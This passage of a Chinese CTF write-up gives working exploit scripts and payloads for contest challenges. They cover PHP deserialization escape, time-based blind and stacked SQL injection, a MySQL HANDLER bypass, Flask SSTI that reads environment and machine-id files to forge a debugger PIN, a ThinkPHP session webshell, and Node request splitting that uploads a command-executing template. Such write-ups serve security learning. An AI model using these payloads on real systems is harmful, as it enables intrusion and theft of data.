&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $argument)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//echo $argument[0];</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $id = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">public</span> $age = <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">public</span> $nickname;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname); <span class="comment">//危</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"0-0"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">$i1 = <span class="keyword">new</span> Info(<span class="string">"23"</span>,<span class="string">"ddd"</span>);</span><br><span class="line">$i1-&gt;CtrlCase=$user;</span><br><span class="line">$n=<span class="keyword">new</span> User();</span><br><span class="line">$n-&gt;nickname=$i1;</span><br><span class="line">$n-&gt;age=<span class="string">'select "1", "21232f297a57a5a743894a0e4a801fc3"'</span>;</span><br><span class="line">$up=<span class="keyword">new</span> UpdateHelper(<span class="keyword">NULL</span>,<span class="string">"ddd"</span>);</span><br><span class="line">$up-&gt;sql=$n;</span><br><span class="line">$i = <span class="keyword">new</span> Info(<span class="string">"23"</span>,$up);</span><br><span class="line"><span class="keyword">echo</span> serialize($i);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;23&quot;;s:8:&quot;nickname&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;i:2;s:3:&quot;age&quot;;s:46:&quot;select &quot;1&quot;, &quot;21232f297a57a5a743894a0e4a801fc3&quot;&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;23&quot;;s:8:&quot;nickname&quot;;s:3:&quot;ddd&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:4:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;admin&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>接下来就是计算了，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;s:8:&quot;nickname&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;i:2;s:3:&quot;age&quot;;s:46:&quot;select &quot;1&quot;, &quot;21232f297a57a5a743894a0e4a801fc3&quot;&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;23&quot;;s:8:&quot;nickname&quot;;s:3:&quot;ddd&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:4:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;admin&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;s:8:&quot;CtrlCase&quot;;N;&#125; </span><br><span class="line">这段长度是373</span><br></pre></td></tr></table></figure>

<p>我们加一个<code>*</code>替换成<code>hacker</code>后就会多5个字符，所以要添加74个<code>*</code>加1个<code>into</code>加1个<code>union</code>正好<code>74*5+1*2+1*1=373</code>。</p>
<p>在本地调试的时候</p>
<p><img src="2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200223095156234.png" alt="image-20200223095156234"></p>
<p>谷歌一下是因为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>],$Info,<span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:455:&quot;**************************************************************************unioninto&quot;;s:8:&quot;nicknami&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;i:2;s:3:&quot;age&quot;;s:46:&quot;select &quot;1&quot;, &quot;21232f297a57a5a743894a0e4a801fc3&quot;&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;23&quot;;s:8:&quot;nickname&quot;;s:3:&quot;ddd&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:4:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;admin&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;s:8:&quot;CtrlCase&quot;;N;&#125;&quot;;s:8:&quot;nickname&quot;;s:4:&quot;dddd&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>上面的$nickname是一个Object,所以报错，我们把payload中的nickname改为同长度的其他变量名即可。</p>
<p><img src="2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200223231606959.png" alt="image-20200223231606959"></p>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>过滤了<code>select = &gt; &lt;</code>等。 </p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line">url=<span class="string">"http://b2aa87e875e24d8594bc523bf9ca972ed4b62c6107cb493d.changame.ichunqiu.com/?id="</span></span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">dic=<span class="string">"qwertyuiopasdfghjklzxcvbnm1234567890&#123;&#125;-"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">	<span class="keyword">for</span> mid <span class="keyword">in</span> dic:</span><br><span class="line">		payload=<span class="string">r"if(ascii(substr(fl4g,&#123;&#125;,1))%20regexp%20&#123;&#125;,sleep(2),0)"</span></span><br><span class="line">		url_1=url+payload.format(i,ord(mid))</span><br><span class="line">		print(payload.format(i,ord(mid)))</span><br><span class="line">		start_time=time.time()</span><br><span class="line">		r=requests.get(url_1)<span class="comment">#,proxies=proxies)</span></span><br><span class="line">		end_time=time.time()</span><br><span class="line">		<span class="comment">#print(r.content)</span></span><br><span class="line">		<span class="keyword">if</span> end_time-start_time&gt;=<span class="number">2</span>:</span><br><span class="line">			flag+=mid</span><br><span class="line">			print(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<h2 id="Day-2"><a href="#Day-2" class="headerlink" title="Day_2"></a>Day_2</h2><h3 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h3><p>考点：堆叠注入</p>
<p>打开题目给了源码，</p>
<p><img src="2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200222150130260.png" alt="image-20200222150130260"></p>
<p>这里说一下sql的预编译和模拟预编译，</p>
<ul>
<li><p>采用预编译时，会先将待执行的sql语句中的参数值用占位符来替代，当有占位符的sql语句模板被数据库编译、解析后，再通过向占位符绑定参数进行查询操作。这样也来，向模板中传入的输入值，都会被当成字符串，可以杜绝sql注入的产生。</p>
<p>预制语句的SQL语法基于三个SQL语句：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">prepare</span> stmt_name <span class="keyword">from</span> preparable_stmt;</span><br><span class="line"><span class="keyword">execute</span> stmt_name [<span class="keyword">using</span> @var_name [, @var_name] ...];</span><br><span class="line">&#123;deallocate | drop&#125; prepare stmt_name;</span><br></pre></td></tr></table></figure>
</li>
<li><p>模拟预编译是为了一些不支持预编译的数据库设置的，客户端程序内部模拟sql数据库中参数绑定的过程。</p>
</li>
</ul>
<p>PDO在默认情况下，是允许多句执行和模拟预编译的，题目源码中在声明PDO实例的时候没有指定不允许多语句执行，不允许模拟预编译。所以这道题可以通过堆叠注入解。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">password=<span class="string">""</span></span><br><span class="line">url = <span class="string">"http://a6f0af74cb42409c8b829fdba30975255144c88cd6c54dd0.changame.ichunqiu.com/?id"</span></span><br><span class="line">string = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;&#125;-,"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        s = j.encode(<span class="string">'hex'</span>)</span><br><span class="line">        yuju=<span class="string">"select sleep(3*(ascii(mid((select fllllll4g from table1),&#123;&#125;,1))=&#123;&#125;));"</span></span><br><span class="line">        yuju=yuju.format(i,ord(j))</span><br><span class="line">        payload=<span class="string">"=0%df' ;SET%20@SQL=0x&#123;&#125;;PREPARE exesql FROM @SQL;EXECUTE exesql;"</span>.format(yuju.encode(<span class="string">"hex"</span>))</span><br><span class="line">        <span class="comment">#print data</span></span><br><span class="line">        st_time=time.time()</span><br><span class="line">        r = requests.get(url+payload)<span class="comment">#,proxies=proxies)</span></span><br><span class="line">        e_time=time.time()</span><br><span class="line">        <span class="comment">#print r.text</span></span><br><span class="line">        <span class="keyword">if</span> e_time-st_time &gt;=<span class="number">3</span>:</span><br><span class="line">			password = password + j</span><br><span class="line">			<span class="keyword">print</span> password</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="comment">#fllllll4g</span></span><br></pre></td></tr></table></figure>

<p>总结一下可以堆叠注入的场景</p>
<ul>
<li>Mysqli的multi_query()</li>
<li>PDO默认情况下的query()</li>
</ul>
<p>参考链接</p>
<p><a href="https://www.freebuf.com/articles/web/216336.html" target="_blank" rel="noopener">从宽字节注入认识PDO的原理和正确使用</a></p>
<p><a href="https://xz.aliyun.com/t/3950" target="_blank" rel="noopener">https://xz.aliyun.com/t/3950</a></p>
<p><a href="https://xz.aliyun.com/t/7132" target="_blank" rel="noopener">https://xz.aliyun.com/t/7132</a></p>
<h3 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h3><p>考点 ：mysql新特性handler</p>
<p>打开题目，界面和强网杯的随便注界面类似，但是过滤了 set、prepare等字段。所以需要采用新的方法来绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure>

<p>之前看一叶飘零师傅的博客里的FudanCTF某道题时，里面用了handler这个新特性：</p>
<p><a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] <span class="keyword">alias</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> index_name &#123; <span class="keyword">FIRST</span> | <span class="keyword">NEXT</span> | PREV | <span class="keyword">LAST</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> &#123; <span class="keyword">FIRST</span> | <span class="keyword">NEXT</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">CLOSE</span></span><br></pre></td></tr></table></figure>

<p><img src="2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200222154705385.png" alt="image-20200222154705385"></p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inject&#x3D;0%27;show%20tables;</span><br><span class="line">inject&#x3D;0%27;handler%20&#96;FlagHere&#96;%20open%20as%20&#96;ss&#96;;handler%20&#96;ss&#96;%20read%20next;</span><br></pre></td></tr></table></figure>

<h3 id="Ezsqli"><a href="#Ezsqli" class="headerlink" title="Ezsqli"></a>Ezsqli</h3><p>考点  ：sys.schema_table_statistics_with_buffer查列名  无列名按位爆破字段。</p>
<p>过滤了 in 所以常规方法查表名，列名都不可以了。用sys.schema_table_statistics_with_buffer来查。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">password=<span class="string">""</span></span><br><span class="line">url = <span class="string">"http://42b9a14929e64c8daf5f5f5a9380b26366da480841da49c6.changame.ichunqiu.com/"</span></span><br><span class="line">string = <span class="string">",0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;&#125;-,abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        payload=<span class="string">"ascii(mid((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))-&#123;&#125;"</span>.format(i,j)</span><br><span class="line">        data=&#123;<span class="string">"id"</span>:payload&#125;</span><br><span class="line">        r = requests.post(url,data=data)<span class="comment">#,proxies=proxies)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">" Nu1L"</span> <span class="keyword">in</span> r.content:</span><br><span class="line">			password = password + chr(j+<span class="number">1</span>)</span><br><span class="line">			<span class="keyword">print</span> password</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>不知道列名，用无列名注入，有过滤了union select ,怎么试都没绕过。然后翻大佬的博客，看到按位爆破方法。参考链接，但是文中的方法在本题有点问题，需要边修改边跑，还可以用十六进制来爆破，这里贴一下十六进制爆破的脚本。</p>
<p><img src="2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200222230548963.png" alt="image-20200222230548963"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">url = <span class="string">"http://af4fcae52ce5463583151b28d2d6921e2843633f7f304a41.changame.ichunqiu.com/"</span></span><br><span class="line">string = <span class="string">"a-0123456789abcdefghijklmnopqrestuvwxyz_&#123;&#125;~"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">44</span>,<span class="number">128</span>):</span><br><span class="line">        payload=<span class="string">"ascii((select (select 1,0x&#123;&#125;)&lt;(select * from f1ag_1s_h3r3_hhhhh limit 1)))-48"</span>.format(password+chr(j).encode(<span class="string">"hex"</span>))</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        data=&#123;<span class="string">"id"</span>:payload&#125;</span><br><span class="line">        r = requests.post(url,data=data,proxies=proxies)</span><br><span class="line">        <span class="keyword">print</span> r.status_code</span><br><span class="line">        <span class="keyword">if</span> <span class="string">" Nu1L"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            password = password + chr(j<span class="number">-1</span>).encode(<span class="string">"hex"</span>)</span><br><span class="line">            <span class="keyword">print</span> password</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="Day-3"><a href="#Day-3" class="headerlink" title="Day_3"></a>Day_3</h2><h3 id="Flask-app"><a href="#Flask-app" class="headerlink" title="Flask_app"></a>Flask_app</h3><p>考点：flask ssti  , 计算pin码</p>
<p>题目环境是python3 ,ssti payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>可以读文件，依次读</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address  #w网卡地址，然后转十进制</span><br><span class="line">&#x2F;etc&#x2F;machine-id              #machine-id</span><br></pre></td></tr></table></figure>

<p>然后利用exp生成PIN码，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'flaskweb'</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">'flask.app'</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>,<span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span></span><br><span class="line">     <span class="comment"># getattr(mod, '__file__', None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'2485377957892'</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">'f3a3a05c96a0a5b36f1af8b3648ad398dc6650ca286ce8c0a39c61bfbbee99b2'</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>

<p>到/console下，运行命令读flag</p>
<p><img src="2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/4XYIL%7BC99$TRWEC41%7DXFOEN.png" alt="img"></p>
<h3 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h3><p>扫目录，给了源码，thinkphp6.0,看到</p>
<p><img src="2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200223220611167.png" alt="image-20200223220611167"></p>
<p>开了session,可以利用之前的session文件写入，大致测试下功能，看下源码，</p>
<p><img src="2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200223220843928.png" alt="image-20200223220843928"></p>
<p>search 可以将我们的输入存到session中。</p>
<p>然后先将PHPSESSID改为后缀为php，这样就可以生成sess_xxxxx.php，首先搜索</p>
<p><code>&lt;?php phpinfo(); ?&gt;</code></p>
<p>可以看到有disabled_function，然后传一个一句话，用蚁剑连上，上传一个之前很火的绕过php7大多版本的脚本，执行/readflag，完事。</p>
<h3 id="Node-game"><a href="#Node-game" class="headerlink" title="Node_game"></a>Node_game</h3><p>这题是改的nullcon HackIM 的一道题，仿着别人的wp,半天没做出来，最后看出题人的博客</p>
<p><a href="http://blog.5am3.com/2020/02/11/ctf-node1/#HackTM-CTF-2020-Draw-with-us" target="_blank" rel="noopener">http://blog.5am3.com/2020/02/11/ctf-node1/#HackTM-CTF-2020-Draw-with-us</a>,</p>
<p>漏洞的原理就是，node8及8以下的版本在设计上有缺陷，在发送的url请求中含有特殊构造的非ascii字符，node 在处理这样的请求时，会将其采用<code>latin1</code>编码，并且会把前面构造的特殊字符转换位HTTP控制字符，形如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:3000&#x2F;query?param&#x3D;1\u&#123;0120&#125;HTTP&#x2F;1.1\u&#123;010D&#125;\u&#123;010A&#125;Host:\u&#123;0120&#125;127.0.0.1:3000\u&#123;010D&#125;\u&#123;010A&#125;Connection:\u&#123;0120&#125;keep-alive\u&#123;010D&#125;\u&#123;010A&#125;\u&#123;010D&#125;\u&#123;010A&#125;GET</span><br></pre></td></tr></table></figure>

<p>会变成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:3000&#x2F;query?param&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:3000</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">GET</span><br></pre></td></tr></table></figure>

<p>这里贴一下5am3师傅的脚本</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">shellCodeRaw=<span class="string">"\r\n"</span></span><br><span class="line"><span class="keyword">var</span> shellCodeRawList = shellCodeRaw.split(<span class="string">""</span>)</span><br><span class="line"><span class="keyword">var</span> shellCodeAsciiList= [];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;shellCodeRawList.length;i++)&#123;</span><br><span class="line">	tmp = shellCodeRawList[i].charCodeAt()</span><br><span class="line">	shellCodeAsciiList.push(tmp.toString(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shellcode=shellCodeAsciiList.join(<span class="string">"&#125;\\u&#123;01"</span>);</span><br><span class="line">shellcode= <span class="string">"\\u&#123;01"</span>+shellcode+<span class="string">"&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">"encodeURI('"</span>+shellcode+<span class="string">"')"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// \r\n --&gt; %C4%8D%C4%8A</span></span><br><span class="line"><span class="comment">// 空格 --&gt; %C4%A0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造如下参数</span></span><br><span class="line"><span class="comment">//z%C4%A0HTTP/1.1%C4%8D%C4%8A%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0/flag%C4%A0HTTP/1.1%C4%8D%C4%8A%C4%8D%C4%8A</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">payloadRaw = <span class="string">"""x HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:8081</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942</span></span><br><span class="line"><span class="string">Content-Length: 6279</span></span><br><span class="line"><span class="string">Origin: http://localhost:8081</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Referer: http://localhost:8081/?action=upload</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------12837266501973088788260782942</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="5am3_get_flag.pug"</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- global.process.mainModule.require('child_process').execSync('evalcmd')</span></span><br><span class="line"><span class="string">-----------------------------12837266501973088788260782942--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getParm</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload = payload.replace(<span class="string">" "</span>,<span class="string">"%C4%A0"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"\n"</span>,<span class="string">"%C4%8D%C4%8A"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"\""</span>,<span class="string">"%C4%A2"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"'"</span>,<span class="string">"%C4%A7"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"`"</span>,<span class="string">"%C5%A0"</span>)</span><br><span class="line">    payload = 